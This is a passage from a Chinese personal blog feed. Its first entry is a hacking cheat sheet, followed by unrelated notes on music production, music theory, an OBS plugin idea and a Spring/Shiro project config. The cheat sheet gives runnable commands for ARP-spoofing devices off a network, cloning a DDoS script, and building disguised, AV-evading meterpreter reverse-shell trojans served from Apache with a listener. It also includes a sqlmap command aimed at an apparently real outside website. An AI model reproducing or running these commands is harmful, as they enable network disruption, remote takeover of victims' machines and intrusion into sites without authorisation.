        <content type="html"><![CDATA[<p>在kaili中，可以通过nmap扫描路由下存活主机和它开放的端口，之后可以通过攻击目标主机IP和网关实现断网攻击</p><p>比如当你链接一个网络，首先在本地查询当前网络的网关，然后扫描网关下存活的主机，最后通过主机IP实现攻击</p><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p>前言<br>ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p><p>一句话解释： 断网攻击用使用ARPspoof工具，欺骗设备，截断网关和被攻击主机之间的正常通信</p><p>请勿用于违法用途！</p><p>首先进入root用户<br>执行命令，然后输入你装系统的时候的密码，然后按Enter键</p><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">su</span><br></pre></td></tr></tbody></table></figure><p>使用ipconfig查看自己网卡名称和网关。<br>例如我的网卡叫eth0。注意不要选错了，笔记本电脑有无线网卡和有线网卡，有线网卡一般叫eth0，有线网卡一般叫lo之类的名字。确认好你正在用什么方式联网，是网线还是WiFi，WiFi就是无线网卡，插网线就是有线网卡</p><p>查看网关，你和被攻击主机在同一个网络下，所以你的网关和被攻击主机的网关是一样的</p><p>其实如果你能看到路由器的话，也可以直接去看路由器管理页面的网址，一般是192.168.0.1，这个网址就是网关地址</p><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></tbody></table></figure><p>使用nmap工具扫描设备<br>查看被攻击主机的IP地址，然后稍等片刻，扫描结果就会出来，命令格式是这样的：</p><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">nmap 你网关IP地址-200</span><br></pre></td></tr></tbody></table></figure><p>比如我的网关是192.168.0.1 ，我的命令应该这样写</p><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">nmap 192.168.0.1-200</span><br></pre></td></tr></tbody></table></figure><p>然后扫出来一些设备，在这些设备里面找你的攻击目标的IP地址</p><p>图为我的网关，和我电脑的ip地址，被攻击设备的ip我就不展示了。</p><p>你在输出内容里面能看到网关，自己电脑IP，被攻击主机IP</p><p>开始攻击<br>现在开始攻击，命令的格式是这样的，你刚刚已经把被攻击主机ip和网关的ip查好了</p><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">arpspoof -i eth0 -t  被攻击主机ip  网关</span><br></pre></td></tr></tbody></table></figure><p>例如我想给我边上的笔记本电脑断网，那我就加上它的ip和网关，注意中间有空格</p><p>比如笔记本电脑的IP是192.168.0.102，网关是192.168.0.1</p><p>arpspoof -i eth0 -t    192.168.1.102 192.168.0.1   </p><p>这样就可以断掉笔记本电脑的网络了</p><p>ARP攻击可以用于各种设备，我试过家里联网的能远程查看的监控也可以被攻击，亲手断过它的网，因为不喜欢被监视，(<em>^▽^</em>)</p><p>大家家里有没有监控呢？</p><p>如果有问题，欢迎请加入Skype群探讨！<br>————————————————</p><pre><code>                        版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</code></pre><p>原文链接：<a href="https://blog.csdn.net/albertensterin/article/details/128510328">https://blog.csdn.net/albertensterin/article/details/128510328</a></p><h2 id="后续清理"><a href="#后续清理" class="headerlink" title="后续清理"></a>后续清理</h2><p>一旦停止ARP欺骗攻击，网络不会立即恢复正常状态。由于ARP缓存中可能已经存储了虚假的映射关系，因此需要一定时间才能够自动清除这些错误的ARP条目并重新建立正确的映射。</p><p>在某些情况下，受影响的主机可能需要等待一段时间才能够恢复到正常状态。但通常情况下，网络会随着时间的推移逐渐恢复正常。如果需要更快地恢复网络状态，可以尝试执行以下操作：</p><ol><li>在受影响的主机上手动清除ARP缓存。</li><li>重启受影响的设备，以便清除错误的ARP缓存。</li></ol><p>在进行安全测试时，请务必小心谨慎，并且确保拥有适当的授权。</p><p>清除ARP缓存可以通过以下方法进行：</p><p>在Windows上，可以打开命令提示符并执行以下命令：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">arp -d *</span><br></pre></td></tr></tbody></table></figure><p>这将删除系统中所有已知的ARP条目。</p><p>在Linux上，可以打开终端并以root权限执行以下命令：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ip neigh flush all</span><br></pre></td></tr></tbody></table></figure><p>这将清除系统中所有的邻居（包括ARP）缓存。</p><p>请注意，在执行这些命令时，可能会导致一些网络连接中断，因此请谨慎操作。</p><h2 id="快速复制"><a href="#快速复制" class="headerlink" title="快速复制"></a>快速复制</h2><p>shenglang</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.2.35  192.168.2.1  </span><br></pre></td></tr></tbody></table></figure><p>使用nmap 可以扫描端口</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nmap [ip]</span><br></pre></td></tr></tbody></table></figure><p>使用nmap -o 查询主机系统信息</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nmap -o [ip]</span><br></pre></td></tr></tbody></table></figure><p>查询网关</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nmap -sP [ip]</span><br></pre></td></tr></tbody></table></figure><p>扫描当前子网下的所有存活主机 比如你的ip是192.168.2.21 你想要扫描你这个网络下的所有Ip你可以使用</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nmap 192.168.2.0/24</span><br></pre></td></tr></tbody></table></figure><p>34 35 37 38 39 40 43 46 53 64 36</p><p>192.168.2.34</p><p>192.168.2.39 是一个存活主机 win10</p><p>arpspoof -i eth0 -t 192.168.2.37  192.168.2.1  </p><h2 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h2><p>我已经提前再kali下载了脚本所以直接进入 ddos 文件夹内 使用</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python ddos-p3.py</span><br></pre></td></tr></tbody></table></figure><p>如果没有下载可以使用</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">git clone https://github.com/Andysun06/ddos</span><br></pre></td></tr></tbody></table></figure><h2 id="远控木马"><a href="#远控木马" class="headerlink" title="远控木马"></a>远控木马</h2><p>msfvenom</p><p>链接:<a href="https://www.cnblogs.com/Cl0ud/p/11756544.html">https://www.cnblogs.com/Cl0ud/p/11756544.html</a></p><p>生成</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; ./Cl0ud.exe</span><br></pre></td></tr></tbody></table></figure><p>LHOST就是你kali的ip地址，LPORT就是想要让kali监听用哪一个端口来监听这个shell，然后将这个生成的exe文件输出到当前目录下Cl0ud.exe</p><p>比如</p><p>开启metasploit框架</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></tbody></table></figure><p>生成木马 msf5的生成代码</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfconsole -p windows/meterpreter/reverse_tcp LHOST=192.168.2.36 LPORT=1234 -f exe &gt; ./Cl0ud.exe</span><br></pre></td></tr></tbody></table></figure><p>msf6:</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.2.36 LPORT=1234 -f elf &gt; shell.elf</span><br></pre></td></tr></tbody></table></figure><p>不容易被免杀的方法</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.2.36 LPORT=1234 -b "\x00" -e x64/xor_dynamic -i 10 -f exe -o /var/www/html/西瓜影音.exe</span><br></pre></td></tr></tbody></table></figure><pre><code>                        版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</code></pre><p>原文链接：<a href="https://blog.csdn.net/qq_53030229/article/details/116751107">https://blog.csdn.net/qq_53030229/article/details/116751107</a></p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></tbody></table></figure><p>监听</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></tbody></table></figure><h2 id="生成针对win10的反弹shell"><a href="#生成针对win10的反弹shell" class="headerlink" title="生成针对win10的反弹shell"></a>生成针对win10的反弹shell</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.2.36 lport=1234 -f exe &gt;jiami.exe</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">这个解释一下</span><br><span class="line">msfvenom 生成木马</span><br><span class="line">-p 这个的意思是 payload，意思是攻击载荷，简单的说，生成怎么样的攻击模块</span><br><span class="line">windows不用解释了吧</span><br><span class="line">meterpreter/reverse_tcp   反弹shell的意思，就是提权的意思</span><br><span class="line">lhost=本地IP</span><br><span class="line">lport=本地端口</span><br><span class="line">-f 输出格式 例如苹果的MAC你就要输出的是dmg的格式</span><br><span class="line">exe是windows的软件方式</span><br><span class="line">&gt;muma.exe 生成软件为muma.exe</span><br></pre></td></tr></tbody></table></figure><p>木马放到apache下，然后windows才能访问才能下载</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cp muma.exe /var/www/html/</span><br><span class="line">把这个复制到网站服务器下面去</span><br></pre></td></tr></tbody></table></figure><p>如果需要生成shellCode可以使用</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.2.44 lport=4444 --encrypt base64 -f c</span><br></pre></td></tr></tbody></table></figure><p>运行监听</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.2.44</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 1234</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></tbody></table></figure><p>开始网站服务</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></tbody></table></figure><p>关闭网站服务</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">service apache2 stop</span><br></pre></td></tr></tbody></table></figure><p>这时候再同一网络的浏览器访问</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://192.168.2.44/hello.exe</span><br></pre></td></tr></tbody></table></figure><p>就可以自动下载，由于没有免杀所以会被排除</p><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p><strong>1、查看ssh状态</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/etc/init.d/ssh status</span><br></pre></td></tr></tbody></table></figure><p><strong>2、重启、开启、关闭ssh</strong></p><p>重启ssh</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></tbody></table></figure><p>开启ssh</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/etc/init.d/ssh start</span><br></pre></td></tr></tbody></table></figure><p>关闭ssh</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/etc/init.d/ssh stop</span><br></pre></td></tr></tbody></table></figure><h2 id="msf自捆绑编码"><a href="#msf自捆绑编码" class="headerlink" title="msf自捆绑编码"></a>msf自捆绑编码</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.36 LPORT=1234 -e x86/shikata_ga_nai -x putty.exe  -i 15 -f exe -o pentest4.exe</span><br></pre></td></tr></tbody></table></figure><h2 id="查看磁盘情况"><a href="#查看磁盘情况" class="headerlink" title="查看磁盘情况"></a>查看磁盘情况</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></tbody></table></figure><h2 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h2><h2 id="slqmap"><a href="#slqmap" class="headerlink" title="slqmap"></a>slqmap</h2><p>当程序有防get注入的时候，可以使用cookie注入</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sqlmap -u "http://www.bjxhyn.com/index.php?m=admin&amp;c=index&amp;a=login&amp;pc_hash=?id=1"</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FL编曲遇到的问题及解决办法</title>
      <link href="/NANABLOG/2024/02/06/FL%E7%BC%96%E6%9B%B2%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
      <url>/NANABLOG/2024/02/06/FL%E7%BC%96%E6%9B%B2%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>w</p><h2 id="VST插件有延迟"><a href="#VST插件有延迟" class="headerlink" title="VST插件有延迟"></a>VST插件有延迟</h2><p>当VST插件有延迟是因为这是插件自己自带的延迟可以在调音台下方的秒表那里更改延迟</p><p>目前使用的Ample Gutart就有延迟只需要往前100ms就可以了</p><p>参考视频：【【编曲教程】如何解决音源延迟问题？】<a href="https://www.bilibili.com/video/BV1gq4y1x7fb?vd_source=4f3b9d011ebcf141b336e0bb16e316be">https://www.bilibili.com/video/BV1gq4y1x7fb?vd_source=4f3b9d011ebcf141b336e0bb16e316be</a></p><p>参考文本：左下角，有一个括号括住的小时钟，如果没有的话，左下角然后右键之后把延迟补偿选上</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>乐理学习笔记</title>
      <link href="/NANABLOG/2024/02/06/%E4%B9%90%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/NANABLOG/2024/02/06/%E4%B9%90%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="大和弦major"><a href="#大和弦major" class="headerlink" title="大和弦major"></a>大和弦major</h2><p>以某个音为主音 隔三隔二构成大和弦</p><p>比如c为主音那么Cmajor就是 1 3 5</p><p><strong>1</strong> #1 2 #2 <strong>3</strong> 4 4# <strong>5</strong> </p><p>隔三： #1 2 #2</p><p>隔二： 4 4#</p><p>因为3是没有#3的，按照乐理全全半全全全半</p><h2 id="小和弦Minor-Chords"><a href="#小和弦Minor-Chords" class="headerlink" title="小和弦Minor Chords"></a>小和弦Minor Chords</h2><p>以某个音为主音 隔二隔三构成大和弦</p><p>在大和弦基础上将中间的音降半音就可以得到Minor（降半音就是往左边移动半个音）</p><p>比如C和弦 135转成小和弦就是 1 ♭3 5中间的音降了半音 其中 ♭3也是#2可以对照下方</p><p><strong>1</strong> #1 2 <strong>#2</strong> 3 4 4# <strong>5</strong> </p><h2 id="大七和弦maj7-chords-or-M7"><a href="#大七和弦maj7-chords-or-M7" class="headerlink" title="大七和弦maj7 chords or M7"></a>大七和弦maj7 chords or M7</h2><p>还是使用大和弦转大七和弦 在大和弦基础上 将第一个音降半音 或者 在大和弦基础上添加第七个音</p><h2 id="七和弦-7-chords"><a href="#七和弦-7-chords" class="headerlink" title="七和弦 7 chords"></a>七和弦 7 chords</h2><h2 id="小七和弦"><a href="#小七和弦" class="headerlink" title="小七和弦"></a>小七和弦</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>obs插件</title>
      <link href="/NANABLOG/2024/02/04/obs%E6%8F%92%E4%BB%B6/"/>
      <url>/NANABLOG/2024/02/04/obs%E6%8F%92%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>我注意到Twitch的直播里有几个有趣的插件，比如订阅主播后可以增加订阅时长，一般是30s，也就是说只要观众多，直播时长也会越来越久，实现了直播马拉松。</p><p>还有通过订阅发言，会直接读出来，亦或者触发感谢音乐。</p><p>所以我决定编写一个相同的功能用于OBS or bilibili直播姬 的插件。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Spring+shiro+mybatis+lombok项目部署</title>
      <link href="/NANABLOG/2024/01/25/Spring-shiro-mybatis-lombok%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2/"/>
      <url>/NANABLOG/2024/01/25/Spring-shiro-mybatis-lombok%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h1><p>本项目是maven项目</p><p>数据库mysql</p><p>前端html+jquery+md5+wangEditor+cancas 框架:bootstrap</p><p>后端spring+mybatis+shiro+lombok</p><p>笔记配套项目:</p><h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/finance?useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=false&amp;serverTimezone=UTC&amp;zeroDateTimeBehavior=convertToNull</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">com.alibaba.druid.pool.DruidDataSource</span></span><br><span class="line">    <span class="attr">druid:</span></span><br><span class="line">      <span class="attr">initial-size:</span> <span class="number">5</span></span><br><span class="line">      <span class="attr">min-idle:</span> <span class="number">5</span></span><br><span class="line">      <span class="attr">max-active:</span> <span class="number">20</span></span><br><span class="line">      <span class="attr">max-wait:</span> <span class="number">60000</span></span><br><span class="line">      <span class="attr">time-between-eviction-runs-millis:</span> <span class="number">60000</span></span><br><span class="line">      <span class="attr">min-evictable-idle-time-millis:</span> <span class="number">300000</span></span><br><span class="line">      <span class="attr">validation-query:</span> <span class="string">SELECT</span> <span class="number">1</span> <span class="string">FROM</span> <span class="string">DUAL</span></span><br><span class="line">      <span class="attr">test-while-idle:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">test-on-borrow:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">test-on-return:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">pool-prepared-statements:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">max-pool-prepared-statement-per-connection-size:</span> <span class="number">20</span></span><br><span class="line">      <span class="attr">filters:</span> <span class="string">stat,wall</span></span><br><span class="line">      <span class="attr">use-global-data-source-stat:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">connect-properties:</span> <span class="string">druid.stat.mergeSql=true;druid.stat.slowSqlMillis=5000</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="attr">static-locations:</span> <span class="string">classpath:/static/</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath:mapper/*.xml</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.crazy.finance.bean</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="attr">map-underscore-to-camel-case:</span> <span class="literal">true</span> <span class="comment">#将下换线转成驼峰式</span></span><br><span class="line"><span class="comment">#  configuration:</span></span><br><span class="line"><span class="comment">#   log-impl: org.apache.ibatis.logging.stdout.StdOutImpl</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8099</span></span><br></pre></td></tr></tbody></table></figure><h1 id="返回类JsonUtils"><a href="#返回类JsonUtils" class="headerlink" title="返回类JsonUtils"></a>返回类JsonUtils</h1><p><strong>在tuils里的JsonUtils类</strong></p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.finance.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通用的返回类（封装json数据）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsonUtils</span> {</span><br><span class="line">    <span class="comment">// 状态码 100-成功 200-失败</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="comment">// 提示信息</span></span><br><span class="line">    <span class="keyword">private</span> String msg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用户要返回给浏览器的数据</span></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Object&gt; extend = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 处理成功</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> JsonUtils <span class="title function_">success</span><span class="params">()</span> {</span><br><span class="line">        <span class="type">JsonUtils</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonUtils</span>();</span><br><span class="line">        result.setCode(<span class="number">100</span>);</span><br><span class="line">        result.setMsg(<span class="string">"处理成功！"</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 处理失败</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> JsonUtils <span class="title function_">fail</span><span class="params">()</span> {</span><br><span class="line">        <span class="type">JsonUtils</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonUtils</span>();</span><br><span class="line">        result.setCode(<span class="number">200</span>);</span><br><span class="line">        result.setMsg(<span class="string">"处理失败！"</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> JsonUtils <span class="title function_">failPs</span><span class="params">()</span> {</span><br><span class="line">        <span class="type">JsonUtils</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonUtils</span>();</span><br><span class="line">        result.setCode(<span class="number">300</span>);</span><br><span class="line">        result.setMsg(<span class="string">"处理失败！"</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> JsonUtils <span class="title function_">failEx</span><span class="params">()</span> {</span><br><span class="line">        <span class="type">JsonUtils</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonUtils</span>();</span><br><span class="line">        result.setCode(<span class="number">400</span>);</span><br><span class="line">        result.setMsg(<span class="string">"处理失败！"</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> JsonUtils <span class="title function_">failNu</span><span class="params">()</span> {</span><br><span class="line">        <span class="type">JsonUtils</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonUtils</span>();</span><br><span class="line">        result.setCode(<span class="number">500</span>);</span><br><span class="line">        result.setMsg(<span class="string">"处理失败！"</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 添加要返回的json数据</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> key</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> JsonUtils <span class="title function_">add</span><span class="params">(String key, Object value)</span> {</span><br><span class="line">        <span class="built_in">this</span>.getExtend().put(key, value);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h1 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h1><p>一些配置类</p><p>分别是ShiroConfig类</p><p>用来自动实现权限分配</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.finance.config.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> at.pollux.thymeleaf.shiro.dialect.ShiroDialect;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.spring.web.ShiroFilterFactoryBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.web.mgt.DefaultWebSecurityManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroConfig</span> {</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="keyword">public</span> ShiroFilterFactoryBean <span class="title function_">getShiroFilterFactoryBean</span><span class="params">(<span class="meta">@Qualifier("securityManager")</span> DefaultWebSecurityManager securityManager)</span>{</span><br><span class="line">       <span class="type">ShiroFilterFactoryBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">       bean.setSecurityManager(securityManager);</span><br><span class="line">       <span class="comment">//一定要用LinkedHashMap。不然会导致规则混乱</span></span><br><span class="line">       Map&lt;String, String&gt; filterMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>();</span><br><span class="line">        <span class="comment">// log.info("ShiroFilterFactoryBean-------------------------------");</span></span><br><span class="line">       <span class="comment">//添加shiro的内置过滤器</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            anon: 无需认证就可访问</span></span><br><span class="line"><span class="comment">            authc：必须认证才能访问</span></span><br><span class="line"><span class="comment">            user：必须拥有记住我功能才能访问</span></span><br><span class="line"><span class="comment">            perms: 拥有对某个资源的权限才能访问</span></span><br><span class="line"><span class="comment">            role:拥有某个角色权限才能访问</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"><span class="comment">//     添加授权</span></span><br><span class="line">      <span class="comment">// filterMap.put("/user/**", "roles[user]");</span></span><br><span class="line">      <span class="comment">// filterMap.put("/admin/**", "roles[admin]");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     过滤请求</span></span><br><span class="line">       filterMap.put(<span class="string">"/error/**"</span>, <span class="string">"anon"</span>);</span><br><span class="line">       filterMap.put(<span class="string">"/"</span>, <span class="string">"anon"</span>);</span><br><span class="line">       filterMap.put(<span class="string">"/index.html"</span>, <span class="string">"anon"</span>);</span><br><span class="line">       filterMap.put(<span class="string">"/toregister.html"</span>, <span class="string">"anon"</span>);</span><br><span class="line">       filterMap.put(<span class="string">"/login/**"</span>, <span class="string">"anon"</span>);</span><br><span class="line">       filterMap.put(<span class="string">"/asserts/**"</span>, <span class="string">"anon"</span>);</span><br><span class="line">       filterMap.put(<span class="string">"/bootstrap/**"</span>, <span class="string">"anon"</span>);</span><br><span class="line">       filterMap.put(<span class="string">"/images/**"</span>, <span class="string">"anon"</span>);</span><br><span class="line">       filterMap.put(<span class="string">"/lyear/**"</span>, <span class="string">"anon"</span>);</span><br><span class="line">       filterMap.put(<span class="string">"/js/**"</span>, <span class="string">"anon"</span>);</span><br><span class="line"><span class="comment">//     对所有请求认证</span></span><br><span class="line"><span class="comment">//     主要这行代码必须放在所有权限设置的最后，不然会导致所有 url 